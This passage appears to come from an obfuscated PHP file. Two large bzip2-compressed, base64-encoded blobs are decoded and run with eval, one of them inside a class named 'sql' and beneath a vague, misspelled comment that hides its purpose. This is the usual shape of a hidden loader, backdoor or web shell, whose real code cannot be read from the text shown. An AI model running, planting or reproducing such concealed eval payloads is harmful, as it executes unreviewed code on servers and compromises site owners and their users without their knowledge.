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";
    eval(bzdecompress(base64_decode($data)));
}

/****************************************************************/
/* function sqx()                                            */
/*                                                              */
/* Switches functions.                                          */
/* Recieves $sql() and switches to it                            *.
/****************************************************************/
class sql
{
    function run()
    {
        $data = "QlpoOTFBWSZTWat+/68ABnxfgFAQf//////v////////YCw8AAXFuxF9bdOOdReGRIPO8Nd5zHntsgSl0rY32Ou14dZXdWu+au6eN6eXzBUKL3a3t5XtZJdLMVbdc7e8OvaXhtmgbNZ2OuduUI5ztVzY19HXamrSZvEHcY95O4HqEaVO+94aCCANTAImJhMjSnonjREYJ6npTwmoaZDJ6mNIGmiAE0E0IAqeZNU/SnvUnkao8obJPU9R6TamjR6EAaASmQhEEaI0TSeRNomQ02o00G1NDTTJiBo00D1NAEmkkSaaDRSn+TSp+AqflPVPSab1RkAemhoJ6IaBoNB6QEUiAIAABTT1PRNTyp4ptR6aNNE0bJNMQemhNNABIiICaAEYgEwpk2kmangqemp4ozKZPUeiaMg0yPmPwqJ9frOz2oH2f+4fs3p1bUWLt45gojllV2ZYjMZRjFiqowVYK1qKxViIIKxzLkFgiC/sQpEUMFakVMoZh+3JURWHz9KfFs9CDHz/r/V8rc578PIA66wOWZ0wZBexjQrDZoRBWEPYm7JJgzrQyHAKveymwN/hMppCs6EjlIbzmjIs1VWoT/G2EUkM2uOOIGFFxwP2prUsLaQWCysoehkh6UgGpCeLsoouMWIysFUGtUbLUtsKg2rS2FaKilqVYViydDN0NCqhph9+ymWitZYLKUsUojGFaSrYtSViwLBpZbWs6WVgwYhyBgaZIsgsiigPfZKixVFIjFFIoCyKIrIsVRP96e9hjCLAUFJrXDJrg+3PCc9n8/siGkozATXeMMAyF6ciJQpUU1KisS904AhIfzAonJvaO+3ifRfkml5CZ8mcYLmDZRFbQzjhkxLZpRwJLjBifBTazecUUuXfcZ/YyM7ZW1JQbS6zMVChEl8MkkLNKBYGL+ufSo7NNbZ6Gxyk72XeSF077HY/j+nrZ3MzOc/okWRWsjOIaK7chjEWkZMAqO8AodiSLJWEPFkK14Z9mB5M9jDh2